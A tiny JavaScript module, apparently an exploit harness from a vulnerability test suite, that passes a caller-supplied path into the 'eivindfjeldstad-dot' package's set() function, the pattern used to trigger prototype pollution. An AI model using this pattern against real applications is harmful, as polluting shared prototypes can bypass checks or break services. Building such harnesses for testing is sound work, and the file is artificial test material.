function exploitFunction(payload) {
  const a = require("eivindfjeldstad-dot");
  
  let path = payload.path;
  a.set({}, path, "yes");
}

module.exports = { exploitFunction };